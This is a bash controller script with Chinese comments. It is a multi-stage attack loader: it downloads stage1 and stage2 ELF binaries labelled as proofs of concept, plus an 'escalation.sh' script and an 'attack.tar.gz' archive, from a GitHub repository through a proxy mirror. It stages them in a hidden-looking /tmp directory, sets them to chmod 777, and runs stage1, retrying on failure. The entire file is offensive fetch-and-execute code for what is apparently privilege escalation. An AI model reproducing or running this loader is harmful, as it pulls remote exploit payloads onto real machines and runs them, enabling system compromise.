#!/usr/bin/bash
set -euo pipefail

# ==================== 配置 ====================
MAX_RETRIES=5
RETRY_DELAY=8
TMPDIR_BASE="/tmp/.sysd-tmp"

# escalation.sh 固定放在 /tmp 下
ESCALATION_SH="/tmp/escalation.sh"
ESCALATION_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/escalation.sh"

touch /tmp/controller_maked_test_01122110

# ==================== Stage2 URL 映射表 ====================
declare -A STAGE2_URL_MAP=(
    ["org"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-original"
    ["haoc"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-haoc"
    ["ubuntu"]="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-ubuntu"
    ["test"]="https://github.com/Jerryy959/controller/releases/download/v1/escalation-db.elf" # 仅占位，实际不使用
)
DEFAULT_STAGE2="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz"

# ==================== 日志函数 ====================
log() {
    local level="$1"; shift
    printf "[%s] [%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$*" >&2
}
log_info() { log "INFO" "$@"; }
log_warn() { log "WARN" "$@"; }
log_error() { log "ERROR" "$@"; }
log_success() { log " OK " "$@"; }

# ==================== 参数检查 + 特殊 test 处理 ====================
if [ $# -ne 1 ]; then
    log_error "用法: $0 <hostname>"
    log_error "支持的主机名: ${!STAGE2_URL_MAP[*]} (test 为测试模式)"
    exit 1
fi

HOST_NAME="$1"
HOST_NAME="${HOST_NAME,,}"  # 转小写

if [ "$HOST_NAME" = "test" ]; then
    echo "test start"
    log_success "================= TEST 模式被触发 ================="
    log_success "主机标识: test"
    log_success "本次仅进行测试，不下载、不执行任何 stage"
    log_success "控制器测试模式正常结束"
    exit 0
fi

# 正常流程 - 获取 stage2 URL
STAGE2_URL="${STAGE2_URL_MAP[$HOST_NAME]:-$DEFAULT_STAGE2}"
if [ "$STAGE2_URL" = "$DEFAULT_STAGE2" ] && [ -z "${STAGE2_URL_MAP[$HOST_NAME]+isset}" ]; then
    log_warn "未知主机名 '$HOST_NAME'，使用默认 stage2: $DEFAULT_STAGE2"
else
    log_info "检测到主机: $HOST_NAME → stage2: $STAGE2_URL"
fi

# ==================== Stage1 URL（固定） ====================
STAGE1_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/poc/poc-oe-original"

# ==================== 准备临时目录 ====================
RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
TMPDIR="${TMPDIR_BASE}-${RAND_SUFFIX}"
mkdir -p "$TMPDIR" || { log_error "创建临时目录失败: $TMPDIR"; exit 1; }
cd "$TMPDIR" || { log_error "进入临时目录失败: $TMPDIR"; exit 1; }

log_info "工作目录: $TMPDIR"
log_info "Stage1: $STAGE1_URL"
log_info "Stage2: $STAGE2_URL (主机: $HOST_NAME)"

# ==================== 下载函数 ====================
download_file() {
    local url="$1" output="$2" desc="$3"
    log_info "正在下载 ${desc}... (${url})"
    if ! wget -q --no-cache --tries=3 --timeout=15 "$url" -O "$output"; then
        log_error "下载 ${desc} 失败: ${url}"
        return 1
    fi
    log_success "${desc} 下载完成: ${output} ($(du -h "$output" | cut -f1))"
    chmod +x "$output" 2>/dev/null || true
    return 0
}

# ==================== 主流程 ====================
attempt=1
while [ $attempt -le $MAX_RETRIES ]; do
    log_info "================= 第 ${attempt}/${MAX_RETRIES} 次尝试 ================="

    RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
    stage1_bin="s1_${RAND_SUFFIX}.elf"
    stage2_bin="s2.elf"

    if ! download_file "$STAGE1_URL" "$stage1_bin" "Stage1"; then
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
        continue
    fi

    if ! download_file "$STAGE2_URL" "$stage2_bin" "Stage2"; then
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
        continue
    fi

    

    # ===================== 下载 escalation.sh 到 /tmp =====================
    log_info "准备下载 escalation.sh 到固定位置: $ESCALATION_SH"

    if ! wget -q --no-cache --tries=3 --timeout=15 \
            "$ESCALATION_URL" -O "$ESCALATION_SH"; then
        log_error "下载 escalation.sh 失败: $ESCALATION_URL"
            # 这里你可以选择 exit 1 或者 continue 看需求
            # exit 1
    else
        chmod 755 "$ESCALATION_SH" 2>/dev/null || true
        log_success "escalation.sh 已成功下载到 $ESCALATION_SH"
    fi

    # ===================== 下载 attack.tar.gz 到 /tmp =====================
    log_info "准备下载 attack.tar.gz 到 /tmp"

    if ! wget -q --no-cache --tries=3 --timeout=15 \
        "https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz" \
        -O "/tmp/attack.tar.gz"; then
        log_error "下载 attack.tar.gz 失败"
        # 可选：exit 1   # 如果失败就退出，看你需求
    else
        log_success "attack.tar.gz 已成功下载到 /tmp/attack.tar.gz"
        # 故意不加 chmod 755，因为压缩包不需要执行权限
    fi

    log_info "下载阶段完成，继续后续操作..."
    log_info "启动 Stage1 (host=$HOST_NAME)"

    if STAGE2_URL="$STAGE2_URL" \
       STAGE2_FILENAME="$stage2_bin" \
       HOST_IDENTIFIER="$HOST_NAME" \
        chmod 777 "./$stage1_bin" "./$stage2_bin" && ./"$stage1_bin" | tee /tmp/stage1.log; then

        log_success "Stage1 执行成功 (退出码: $?)"

        

        log_success "控制器正常退出"
        exit 0

    else
        exit_code=$?
        log_error "Stage1 执行失败 (退出码: $exit_code)"
        log_warn "将在 ${RETRY_DELAY} 秒后重试... ($((attempt + 1))/${MAX_RETRIES})"
        attempt=$((attempt + 1))
        sleep $RETRY_DELAY
    fi
done

log_error "Stage1 在 $MAX_RETRIES 次尝试后仍然失败！"
exit 1